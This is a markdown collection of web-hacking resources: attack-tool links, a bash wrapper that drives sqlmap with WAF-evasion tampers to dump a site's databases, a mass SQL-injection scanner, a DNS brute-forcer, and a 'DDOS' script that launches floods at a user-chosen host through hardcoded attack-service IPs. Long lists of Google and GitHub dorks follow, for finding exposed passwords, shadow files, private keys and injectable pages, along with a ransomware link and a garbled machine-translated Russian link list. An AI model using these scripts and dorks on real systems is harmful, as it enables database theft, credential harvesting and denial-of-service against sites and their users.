### Web Attacks:

- [SQLmap](https://github.com/sqlmapproject/sqlmap)
- [XAttacker](https://github.com/Moham3dRiahi/XAttacker)
- [Fuxploider](https://github.com/almandin/fuxploider)
- [Wordpresscan](https://github.com/swisskyrepo/Wordpresscan)
- [SiteBroker](https://github.com/Anon-Exploiter/SiteBroker)
- [NoSQLMap](https://github.com/codingo/NoSQLMap)
- [Sqli-scanner](https://github.com/the-c0d3r/sqli-scanner)
- [Joomscan](https://github.com/rezasp/joomscan)
- [Metagoofil](https://github.com/laramies/metagoofil)
- [Sublist3r](https://github.com/aboul3la/Sublist3r)
- [WAFNinja](https://github.com/khalilbijjou/WAFNinja)
- [Dirsearch](https://github.com/maurosoria/dirsearch)
- [XSStrike](https://github.com/s0md3v/XSStrike)
- [LinksF1nd3r](https://github.com/ihebski/LinksF1nd3r)
- [Rapidscan](https://github.com/skavngr/rapidscan)

#### Auto_scanners

![hot](https://cirt.net/files/alienlogo_3.gif)

- [BruteX](https://github.com/1N3/BruteX)
- [BlackWidow](https://github.com/1N3/BlackWidow)
- [S3Scanner](https://github.com/sa7mon/S3Scanner)
- [CRLF-Injection-Scanner](https://github.com/MichaelStott/CRLF-Injection-Scanner)
- [jaeles](https://github.com/jaeles-project/jaeles)
- [kube-scan](https://github.com/random-robbie/kube-scan)
- [Subrake](https://github.com/hash3liZer/Subrake)
- [Osmedeus](https://github.com/j3ssie/Osmedeus)
- [nikto](https://github.com/sullo/nikto)

#### sqlmap automate

```
#!/bin/bash

clear



echo "
              *         *      *         *
          ***          **********          ***
       *****           **********           *****
     *******           **********           *******
   **********         ************         **********
  ****************************************************
 ******************************************************
********************************************************
********************************************************
********************************************************
 ******************************************************
  ********      ************************      ********
   *******       *     *********      *       *******
     ******             *******              ******
       *****             *****              *****
          ***             ***              ***
            **             *              **
"

echo
echo -n "[+] Website: " && read site
echo

python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=charencode,space2comment,between,modsecurityzeroversioned --dbs --batch
echo
echo -n "[+] DB: " && read db
echo
		
python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=between,modsecurityzeroversioned  -D $db --tables
																		 
echo
echo -n "[+] Table: " && read tb
echo

python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=between,modsecurityzeroversioned --batch -D $db -T $tb --columns

echo
echo -n "[+] Column: " && read cl
echo

python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=between,modsecurityzeroversioned --batch -D $db -T $tb -C $cl --dump

```
#### FireWave-Mass-Sql-Scan

usage: python FireWave.py domains.txt

Required: requests and colorama

install: pip install requests

install: pip install colorama

```
# coding: utf-8

import sys
import os



os.system("clear||cls")

try:
        import requests
except:
        print ("install requests: pip install requests")
	      						
try:
        from colorama import *

except:
        print ("install colorama: pip install colorama")
				  
print (Style.BRIGHT + Fore.CYAN + '''
 /$$$$$$$$ /$$                     /$$      /$$
| $$_____/|__/                    | $$  /$ | $$
| $$       /$$  /$$$$$$   /$$$$$$ | $$ /$$$| $$  /$$$$$$  /$$    /$$ /$$$$$$
| $$$$$   | $$ /$$__  $$ /$$__  $$| $$/$$ $$ $$ |____  $$|  $$  /$$//$$__  $$
| $$__/   | $$| $$  \__/| $$$$$$$$| $$$$_  $$$$  /$$$$$$$ \  $$/$$/| $$$$$$$$
| $$      | $$| $$      | $$_____/| $$$/ \  $$$ /$$__  $$  \  $$$/ | $$_____/
| $$      | $$| $$      |  $$$$$$$| $$/   \  $$|  $$$$$$$   \  $/  |  $$$$$$$
|__/      |__/|__/       \_______/|__/     \__/ \_______/    \_/    \_______/
Usage: FireWave.py <target.txt> \n''' + Fore.RESET + Style.RESET_ALL)

sql = "%5c"
logs = []
webi = open('result.txt','w')
headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1'}

if len(sys.argv) >= 2:
   target = sys.argv[1]
   with open (target) as tag:
       lista = tag.readlines()
       for listy in lista:
           x = listy.rstrip('\n')
           y = sql.rstrip('\n')
           web = x+y
           web = web.strip('\n')
           up = requests.get(web, headers=headers)
           if "mysql_num_rows()" in up.text or "Mysql" in up.text or "Sql syntax" in up.text or "Warning: mysql_fetch_array()" in up.text or "valid MySQL result" in up.text or "MySqlClient." in up.text or "mysql_fetch_assoc()" in up.text or "mysql_fetch_array" in up.text or "session_start()"in up.text or "getimagesize()" in up.text or "is_writable" in up.text or "unknown()" in up.text or "mysql_result()" in up.text or "pg_exec()" in up.text or "mysql_query()" in up.text or  "array_merge" in up.text or "Pregmatch()" in up.text or "filesize()" in up.text or "require()"in up.text or  "You have an error in your SQL syntax" in up.text or  "Warning: mysql" in up.text or "function.mysql" in up.text or "MySQL result index" in up.text or "MySQL Error" in up.text or "MySQL ODBC" in up.text or  "MySQL Driver" in up.text or "mysqli.query" in up.text or "numrows" in up.text or "mysql error:" in up.text or "supplied argument is not a valid MySQL result resource" in up.text or  "on MySQL result index" in up.text or "Error Executing Database Query" in up.text or "mysql" in up.text or "SQL" in up.text:
              print
              print ("[+] Vull SQL: " + Style.BRIGHT + Fore.GREEN + x + Fore.RESET + Style.RESET_ALL)
									
	      logs.append(x+'\n')
           else:
                print 
                print ("[!] Not Vull: " + Style.BRIGHT +  Fore.RED + x + Fore.RESET + Style.RESET_ALL)

webi.writelines(logs)
webi.close()
```
#### DebWave
Enumerador de DNS com WordList, feito em python utilizando Sys e Socket!

Required Socket and Sys

usage: debwave.py target list.txt

remove http and https !

exemple http://www.google.com/ -> google.com
```
import socket
import sys
import os

os.system("clear||cls")

print ("""
                             @@@
                             @@@
                              @@@                       H A P P Y
                              @@@
                      @@@@@@@@@@@@@@@@@@@@@@         H A L L O W E E N
                    @@@@@@@@@@@@@@@@@@@@@@@@@@
                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                @@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@
              @@@@@@@@@   @@@@@@@@@@@@@@   @@@@@@@@@
            @@@@@@@@@@     @@@@@@@@@@@@     @@@@@@@@@@
           @@@@@@@@@@       @@@@  @@@@       @@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@
            @@@@@@@@  @@ @@ @@ @@ @@ @@ @@ @  @@@@@@@@
              @@@@@@@                        @@@@@@@
                @@@@@@  @@ @@ @@ @@ @@ @@ @ @@@@@@
                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                    @@@@@@@@@@@@@@@@@@@@@@@@@@
                      @@@@@@@@@@@@@@@@@@@@@@
 		   | DNS Enumering BruteForce |
		   |           ./O8           |""")

print
print "Usage: DebWave.py <target> <list.txt> "
print

if len(sys.argv) >= 2:
   target = sys.argv[1]
   lista = sys.argv[2]
   with open (lista) as arquivo:
       brute = arquivo.readlines()
       for btf in brute:
           DNS = btf.rstrip("\n") + "." + target
           try:
               print "[#] DNS: " + DNS + " : "+ socket.gethostbyname(DNS)
           except socket.gaierror:
               pass
```

#### DDOS

```
import os
import time
# Coding by KriptonWave

# Twitter: @KryptonWave1
# Discord: KriptonWave#9010


os.system("clear||cls")


index = (r"""
██████╗ ██╗████████╗██╗ ██████╗ █████╗ 
██╔══██╗██║╚══██╔══╝██║██╔════╝██╔══██╗
██████╔╝██║   ██║   ██║██║     ███████║
██╔═══╝ ██║   ██║   ██║██║     ██╔══██║
██║     ██║   ██║   ██║╚██████╗██║  ██║
╚═╝     ╚═╝   ╚═╝   ╚═╝ ╚═════╝╚═╝  ╚═╝
""")
 
menu = (r"""[1] NTP      [4] ACK      [7] STROM
[2] DNS      [5] XMASS    [8] COD
[3] LDAP     [6] SSYN""")


headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1'}
          

try:
    import requests

except:
       print (index)
       print ("[!] Install requests: pip install requests")
       exit()


print (index)
print (menu)

print (" ")
esc = input("Numero da opção desejada: ")
print (" ")
host = input("Target/Host: ")
port = input("Port: ")
time = input("Time: ")

if esc == "1":
   esc = "NTP"

   api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
   ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

   for x in ips:

       atk = ("http://"+x+"/"+api)
       r = requests.get(atk, headers=headers)
              
       if "Attack Launch On" in r.text:
            while True:
               print (f"[+] ATACK INICIADO EM: {host}")
       else:
            print ("[!] ERROR")
            exit()

elif esc == "2":
     esc = "DNS"
     
     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:

         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)
	 
         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "3":
     esc = "LDAP"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)
 
         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "4":
     esc = "ACK"
     
     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()
elif esc == "5":
     esc = "XMASS"
     
     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk,headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "6":
     esc = "SSYN"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "7":
     esc = "STROM"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]
     
     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "8":
     esc = "COD"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

```

```

"          _                      _          "
"   _     /||       .   .        ||\     _   "
"  ( }    \||D    '   '     '   C||/    { %  "
" | /\__,=_[_]   '  .   . '       [_]_=,__/\ |"
" |_\_  |----|                    |----|  _/_|"
" |  |/ |    |                    |    | \|  |"
" |  /_ |    |                    |    | _\  |"

	It is all fun and games until someone gets hacked!
 
------------------------------------------------------------------------------------------
Explanations:

cache: If you include other words in the query, Google will highlight those words within
	the cached document. For instance, [cache:www.google.com web] will show the cached
	content with the word “web” highlighted. This functionality is also accessible by
	clicking on the “Cached” link on Google’s main results page. The query [cache:] will
	show the version of the web page that Google has in its cache. For instance,
	[cache:www.google.com] will show Google’s cache of the Google homepage. Note there
	can be no space between the “cache:” and the web page url.
------------------------------------------------------------------------------------------
link: The query [link:] will list webpages that have links to the specified webpage.
	For instance, [link:www.google.com] will list webpages that have links pointing to the
	Google homepage. Note there can be no space between the “link:” and the web page url.
------------------------------------------------------------------------------------------
related: The query [related:] will list web pages that are “similar” to a specified web
	page. For instance, [related:www.google.com] will list web pages that are similar to
	the Google homepage. Note there can be no space between the “related:” and the web
	page url.
------------------------------------------------------------------------------------------
info: The query [info:] will present some information that Google has about that web
	page. For instance, [info:www.google.com] will show information about the Google
	homepage. Note there can be no space between the “info:” and the web page url.
------------------------------------------------------------------------------------------
define: The query [define:] will provide a definition of the words you enter after it,
	gathered from various online sources. The definition will be for the entire phrase
	entered (i.e., it will include all the words in the exact order you typed them).
------------------------------------------------------------------------------------------
stocks: If you begin a query with the [stocks:] operator, Google will treat the rest
	of the query terms as stock ticker symbols, and will link to a page showing stock
	information for those symbols. For instance, [stocks: intc yhoo] will show information
	about Intel and Yahoo. (Note you must type the ticker symbols, not the company name.)
------------------------------------------------------------------------------------------
site: If you include [site:] in your query, Google will restrict the results to those
	websites in the given domain. For instance, [help site:www.google.com] will find pages
	about help within www.google.com. [help site:com] will find pages about help within
	.com urls. Note there can be no space between the “site:” and the domain.
------------------------------------------------------------------------------------------
allintitle: If you start a query with [allintitle:], Google will restrict the results
	to those with all of the query words in the title. For instance,
	[allintitle: google search] will return only documents that have both “google”
	and “search” in the title.
------------------------------------------------------------------------------------------
intitle: If you include [intitle:] in your query, Google will restrict the results
	to documents containing that word in the title. For instance, [intitle:google search]
	will return documents that mention the word “google” in their title, and mention the
	word “search” anywhere in the document (title or no). Note there can be no space
	between the “intitle:” and the following word. Putting [intitle:] in front of every
	word in your query is equivalent to putting [allintitle:] at the front of your
	query: [intitle:google intitle:search] is the same as [allintitle: google search].
------------------------------------------------------------------------------------------
allinurl: If you start a query with [allinurl:], Google will restrict the results to
	those with all of the query words in the url. For instance, [allinurl: google search]
	will return only documents that have both “google” and “search” in the url. Note
	that [allinurl:] works on words, not url components. In particular, it ignores
	punctuation. Thus, [allinurl: foo/bar] will restrict the results to page with the
	words “foo” and “bar” in the url, but won’t require that they be separated by a
	slash within that url, that they be adjacent, or that they be in that particular
	word order. There is currently no way to enforce these constraints.
------------------------------------------------------------------------------------------
inurl: If you include [inurl:] in your query, Google will restrict the results to
	documents containing that word in the url. For instance, [inurl:google search] will
	return documents that mention the word “google” in their url, and mention the word
	“search” anywhere in the document (url or no). Note there can be no space between
	the “inurl:” and the following word. Putting “inurl:” in front of every word in your
	query is equivalent to putting “allinurl:” at the front of your query:
	[inurl:google inurl:search] is the same as [allinurl: google search].
------------------------------------------------------------------------------------------
Nina Simone intitle:”index.of” “parent directory” “size” “last modified” “description” I Put A Spell On You (mp4|mp3|avi|flac|aac|ape|ogg) -inurl:(jsp|php|html|aspx|htm|cf|shtml|lyrics-realm|mp3-collection) -site:.info
Bill Gates intitle:”index.of” “parent directory” “size” “last modified” “description” Microsoft (pdf|txt|epub|doc|docx) -inurl:(jsp|php|html|aspx|htm|cf|shtml|ebooks|ebook) -site:.info
parent directory /appz/ -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory DVDRip -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory Xvid -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory Gamez -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory MP3 -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory Name of Singer or album -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
filetype:config inurl:web.config inurl:ftp
“Windows XP Professional” 94FBR
ext:(doc | pdf | xls | txt | ps | rtf | odt | sxw | psw | ppt | pps | xml) (intext:confidential salary | intext:"budget approved") inurl:confidential
ext:(doc | pdf | xls | txt | ps | rtf | odt | sxw | psw | ppt | pps | xml) (intext:confidential salary | intext:”budget approved”) inurl:confidential
ext:inc "pwd=" "UID="
ext:ini intext:env.ini
ext:ini Version=... password
ext:ini Version=4.0.0.4 password
ext:ini eudora.ini
ext:ini intext:env.ini
ext:log "Software: Microsoft Internet Information Services *.*"
ext:log "Software: Microsoft Internet Information
ext:log "Software: Microsoft Internet Information Services *.*"
ext:log \"Software: Microsoft Internet Information Services *.*\"
ext:mdb   inurl:*.mdb inurl:fpdb shop.mdb
ext:mdb inurl:*.mdb inurl:fpdb shop.mdb
ext:mdb inurl:*.mdb inurl:fpdb shop.mdb
filetype:SWF SWF
filetype:TXT TXT
filetype:XLS XLS
filetype:asp   DBQ=" * Server.MapPath("*.mdb")
filetype:asp "Custom Error Message" Category Source
filetype:asp + "[ODBC SQL"
filetype:asp DBQ=" * Server.MapPath("*.mdb")
filetype:asp DBQ=\" * Server.MapPath(\"*.mdb\") 
filetype:asp “Custom Error Message” Category Source
filetype:bak createobject sa
filetype:bak inurl:"htaccess|passwd|shadow|htusers"
filetype:bak inurl:\"htaccess|passwd|shadow|htusers\" 
filetype:conf inurl:firewall -intitle:cvs 
filetype:conf inurl:proftpd. PROFTP FTP server configuration file reveals
filetype:dat "password.dat
filetype:dat \"password.dat\" 
filetype:eml eml +intext:"Subject" +intext:"From" +intext:"To"
filetype:eml eml +intext:\"Subject\" +intext:\"From\" +intext:\"To\" 
filetype:eml eml +intext:”Subject” +intext:”From” +intext:”To”
filetype:inc dbconn 
filetype:inc intext:mysql_connect
filetype:inc mysql_connect OR mysql_pconnect 
filetype:log inurl:"password.log"
filetype:log username putty PUTTY SSH client logs can reveal usernames
filetype:log “PHP Parse error” | “PHP Warning” | “PHP Error”
filetype:mdb inurl:users.mdb
filetype:ora ora
filetype:ora tnsnames
filetype:pass pass intext:userid
filetype:pdf "Assessment Report" nessus
filetype:pem intext:private
filetype:properties inurl:db intext:password
filetype:pst inurl:"outlook.pst"
filetype:pst pst -from -to -date
filetype:reg reg +intext:"defaultusername" +intext:"defaultpassword"
filetype:reg reg +intext:\"defaultusername\" +intext:\"defaultpassword\" 
filetype:reg reg +intext:â? WINVNC3â?
filetype:reg reg +intext:”defaultusername” +intext:”defaultpassword”
filetype:reg reg HKEY_ Windows Registry exports can reveal
filetype:reg reg HKEY_CURRENT_USER SSHHOSTKEYS
filetype:sql "insert into" (pass|passwd|password)
filetype:sql ("values * MD5" | "values * password" | "values * encrypt")
filetype:sql (\"passwd values\" | \"password values\" | \"pass values\" ) 
filetype:sql (\"values * MD\" | \"values * password\" | \"values * encrypt\") 
filetype:sql +"IDENTIFIED BY" -cvs
filetype:sql password
filetype:sql password 
filetype:sql “insert into” (pass|passwd|password)
filetype:url +inurl:"ftp://" +inurl:";@"
filetype:url +inurl:\"ftp://\" +inurl:\";@\" 
filetype:url +inurl:”ftp://” +inurl:”;@”
filetype:xls inurl:"email.xls"
filetype:xls username password email
index of: intext:Gallery in Configuration mode
index.of passlist
index.of perform.ini mIRC IRC ini file can list IRC usernames and
index.of.dcim 
index.of.password 
intext:" -FrontPage-" ext:pwd inurl:(service | authors | administrators | users)
intext:""BiTBOARD v2.0" BiTSHiFTERS Bulletin Board"
intext:"# -FrontPage-" ext:pwd inurl:(service | authors | administrators | users) "# -FrontPage-" inurl:service.pwd
intext:"#mysql dump" filetype:sql
intext:"#mysql dump" filetype:sql 21232f297a57a5a743894a0e4a801fc3
intext:"A syntax error has occurred" filetype:ihtml
intext:"ASP.NET_SessionId" "data source="
intext:"About Mac OS Personal Web Sharing"
intext:"An illegal character has been found in the statement" -"previous message"
intext:"AutoCreate=TRUE password=*"
intext:"Can't connect to local" intitle:warning
intext:"Certificate Practice Statement" filetype:PDF | DOC
intext:"Certificate Practice Statement" inurl:(PDF | DOC)
intext:"Copyright (c) Tektronix, Inc." "printer status"
intext:"Copyright © Tektronix, Inc." "printer status"
intext:"Emergisoft web applications are a part of our"
intext:"Error Diagnostic Information" intitle:"Error Occurred While"
intext:"Error Message : Error loading required libraries."
intext:"Establishing a secure Integrated Lights Out session with" OR intitle:"Data Frame - Browser not HTTP 1.1 compatible" OR intitle:"HP Integrated Lights-
intext:"Fatal error: Call to undefined function" -reply -the -next
intext:"Fill out the form below completely to change your password and user name. If new username is left blank, your old one will be assumed." -edu
intext:"Generated   by phpSystem"
intext:"Generated by phpSystem"
intext:"Host Vulnerability Summary Report"
intext:"HostingAccelerator" intitle:"login" +"Username" -"news" -demo
intext:"IMail Server Web Messaging" intitle:login
intext:"Incorrect syntax near"
intext:"Index of" /"chat/logs"
intext:"Index of /network" "last modified"
intext:"Index of /" +.htaccess
intext:"Index of /" +passwd
intext:"Index of /" +password.txt
intext:"Index of /admin"
intext:"Index of /backup"
intext:"Index of /mail"
intext:"Index of /password"
intext:"Microsoft (R) Windows * (TM) Version * DrWtsn32 Copyright (C)" ext:log
intext:"Microsoft CRM : Unsupported Browser Version"
intext:"Microsoft ® Windows * ™ Version * DrWtsn32 Copyright ©" ext:log
intext:"Network Host Assessment Report" "Internet Scanner"
intext:"Network Vulnerability   Assessment Report"
intext:"Network Vulnerability Assessment Report"
intext:"Network Vulnerability Assessment Report" 本文来自 pc007.com
intext:"SQL Server Driver][SQL Server]Line 1: Incorrect syntax near"
intext:"Thank you for your order"   +receipt
intext:"Thank you for your order" +receipt
intext:"Thank you for your purchase" +download
intext:"The following report contains confidential information" vulnerability -search
intext:"phpMyAdmin MySQL-Dump" "INSERT INTO" -"the"
intext:"phpMyAdmin MySQL-Dump" filetype:txt
intext:"phpMyAdmin" "running on" inurl:"main.php"
intextpassword | passcode)   intextusername | userid | user) filetype:csv
intextpassword | passcode) intextusername | userid | user) filetype:csv
intitle:"index of" +myd size
intitle:"index of" etc/shadow
intitle:"index of" htpasswd
intitle:"index of" intext:connect.inc
intitle:"index of" intext:globals.inc
intitle:"index of" master.passwd
intitle:"index of" master.passwd 007电脑资讯
intitle:"index of" members OR accounts
intitle:"index of" mysql.conf OR mysql_config
intitle:"index of" passwd
intitle:"index of" people.lst
intitle:"index of" pwd.db
intitle:"index of" spwd
intitle:"index of" user_carts OR user_cart
intitle:"index.of *" admin news.asp configview.asp
intitle:("TrackerCam Live Video")|("TrackerCam Application Login")|("Trackercam Remote") -trackercam.com
intitle:(“TrackerCam Live Video”)|(“TrackerCam Application Login”)|(“Trackercam Remote”) -trackercam.com
inurl:admin inurl:userlist Generic userlist files

------------------------------------------------------------------------------------------
Using special search string to find vulnerable websites:

inurl:php?=id1
inurl:index.php?id=
inurl:trainers.php?id=
inurl:buy.php?category=
inurl:article.php?ID=
inurl:play_old.php?id=
inurl:declaration_more.php?decl_id=
inurl:pageid=
inurl:games.php?id=
inurl:page.php?file=
inurl:newsDetail.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:show.php?id=
inurl:staff_id=
inurl:newsitem.php?num= andinurl:index.php?id=
inurl:trainers.php?id=
inurl:buy.php?category=
inurl:article.php?ID=
inurl:play_old.php?id=
inurl:declaration_more.php?decl_id=
inurl:pageid=
inurl:games.php?id=
inurl:page.php?file=
inurl:newsDetail.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:show.php?id=
inurl:staff_id=
inurl:newsitem.php?num=
```
### github dorks

```
filename:.npmrc _auth
filename:.dockercfg auth
extension:pem private
extension:ppk private
filename:id_rsa or filename:id_dsa
extension:sql mysql dump
extension:sql mysql dump password
filename:credentials aws_access_key_id
filename:.s3cfg
filename:wp-config.php
filename:.htpasswd
filename:.env DB_USERNAME NOT homestead
filename:.env MAIL_HOST=smtp.gmail.com
filename:.git-credentials
PT_TOKEN language:bash
filename:.bashrc password
filename:.bashrc mailchimp
filename:.bash_profile aws
rds.amazonaws.com password
extension:json api.forecast.io
extension:json mongolab.com
extension:yaml mongolab.com
jsforce extension:js conn.login
SF_USERNAME "salesforce"
filename:.tugboat NOT "_tugboat"
HEROKU_API_KEY language:shell
HEROKU_API_KEY language:json
filename:.netrc password
filename:_netrc password
filename:hub oauth_token
filename:robomongo.json
filename:filezilla.xml Pass
filename:recentservers.xml Pass
filename:config.json auths
filename:idea14.key
filename:config irc_pass
filename:connections.xml
filename:express.conf path:.openshift
filename:.pgpass
filename:proftpdpasswd
filename:ventrilo_srv.ini
[WFClient] Password= extension:ica
filename:server.cfg rcon password
JEKYLL_GITHUB_TOKEN
filename:.bash_history
filename:.cshrc
filename:.history
filename:.sh_history
filename:sshd_config
filename:dhcpd.conf
filename:prod.exs NOT "prod.secret.exs"
filename:prod.secret.exs
filename:configuration.php JConfig password
filename:config.php dbpasswd
filename:config.php pass
path:sites databases password
shodan_api_key language:python
shodan_api_key language:shell
shodan_api_key language:json
shodan_api_key language:ruby
filename:shadow path:etc
filename:passwd path:etc
extension:avastlic
extension:dbeaver-data-sources.xml
filename:sftp-config.json
filename:.esmtprc password
extension:json googleusercontent client_secret
HOMEBREW_GITHUB_API_TOKEN language:shell
```
- https://github.com/deadPix3l/CryptSky/ (вымогатель)
Защита DDOS
- https://github.com/ywjt/Dshield
waf с открытым исходным кодом и правил
- https://github.com/SpiderLabs/ModSecurity
- https: // github.com/xsec-lab/x-waf
- https://github.com/loveshell/ngx_lua_waf
- https://github.com/SpiderLabs/owasp-modsecurity-crs/tree/master/base_rules
руководство по
началу работы https: // wizardforcel .gitbooks.io / web-hacking-101 / content / Web Hacking 101 Китайская версия
- https://wizardforcel.gitbooks.io/asani/content/ Малая запись Безопасность Android Китайская версия
- https://wizardforcel.gitbooks.io/ Руководство по обучению тестированию на проникновение lpad / content / Android на китайском языке
- https://wizardforcel.gitbooks.io/kali-linux-web-pentest-cookbook/content/ Читы для веб-тестов на проникновение Kali Linux для китайской версии
- https://github.com/hardenedlinux/linux-exploit-development-tutorial Введение в разработку эксплойтов для Linux
- https://www.gitbook.com/book/t0data/burpsuite/details burpsuite Руководство по боевым действиям
- http://www.kanxue.com /?article-read-1108.htm=&winzoom=1 Тест на проникновение Node.js приложение
- https://github.com/qazbnm456/awesome-web-security Информация о безопасности веб-сайта и список ресурсов
- https://sec-wiki.com/ sec-wiki Безопасная
коллекция нечетких инструментов Википедии
- https://github.com/ivanfratric/winafl
- https://github.com/attekett/NodeFuzz
- https://github.com/google/oss-fuzz
-http://blog.topsec.com.cn/ad_lab/alphafuzzer/
- http://llvm.org/docs/LibFuzzer.html
Сканер перечисления поддоменов или инструмент для взрывных работ
- https://github.com/n4xh4ck5/N4xD0rk (используйте поисковую систему для сбора суб Доменное имя, можно собрать на испанском)
- https://github.com/jonluca/Anubis
- https://github.com/lijiejie/subDomainsBrute (широко используемый инструмент для подсчета поддоменных доменов, разработанный lijiejie)
- https://github.com/ring04h/wydomain ( Комплексный и точный инструмент перечисления поддоменов для сбора доменных имен, разработанный Pigman)
- https://github.com/le4f/dnsmaper ( инструмент для уничтожения перечисления поддоменов и маркер местоположения на карте)
- https://github.com/ 0xbug / orangescan (онлайн-инструмент сбора информации о поддоменах, который предоставляет веб-интерфейс)
- https://github.com/TheRook/subbrute (эффективный и точный инструмент для уничтожения поддоменов, а также наиболее часто используемая библиотека API поддоменов в сканере)
- https: //github.com/We5ter/GSDF (скрипт запроса субдомена на основе прозрачного сертификата Google SSL)
- https://github.com/mandatoryprogrammer/cloudflare_enum ( скрипт для перечисления субдомена с использованием CloudFlare)
- https://github.com / guelfoweb / knock (получение домена Knock, может использоваться для поиска уязвимостей захвата домена)
- https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker(Несколько способов сбора информации о целевом поддомене)
- https://github.com/code-scan/BroDomain (запрос имени домена брата)
- https://github.com/chuhades/dnsbrute (эффективный инструмент для
уничтожения поддоменов) - https: // github.com/yanxiu0614/subdomain3 (эффективный инструмент для уничтожения поддоменов)
- https://github.com/michenriksen/aquatone ( инструмент для перечисления и обнаружения поддоменов. Может использоваться для обнаружения уязвимости захвата поддоменов)
- https://github.com / evilsocket / dnssearch (инструмент для уничтожения поддоменов)
- https://github.com/reconned/domained (инструмент, который можно использовать для сбора поддоменов)
- https://github.com/bit4woo/Teemo (коллекция доменов И инструмент перечисления)
- https://github.com/laramies/theHarvester (почтовый ящик, сервер сбора информации и инструмент
подсчета поддоменов ) - https://github.com/swisskyrepo/Subdomino (перечисление поддоменов, сканирование портов, сервис Подтверждение выживания)
- https://github.com/nmalcolm/Inventus (инструмент сбора поддоменов, реализованный сканерами)
- https://github.com/aboul3la/Sublist3r (быстрый инструмент подсчета поддоменов),
сканер уязвимостей или инструмент для взрывных работ по типу базы данных
- https://github.com/0xbug/SQLiScanner (пассивная уязвимость внедрения SQL-кода, основанная на SQLMAP и Charles Инструмент сканирования)
- https://github.com/sqlmapproject/sqlmap (король инструментов инъекций sqlmap)
- https://github.com/stamparm/DSSS (99 строк кода для реализации сканера уязвимостей инъекций SQL)
- https://github.com/LoRexxar/Feigong (свободно меняющийся сценарий внедрения MySQL для различных ситуаций)
- https://github.com/youngyangyang04/NoSQLAttack (инструмент атаки для mongoDB)
- https://github.com/Neohapsis/bbqsql (SQL Среда слепого внедрения)
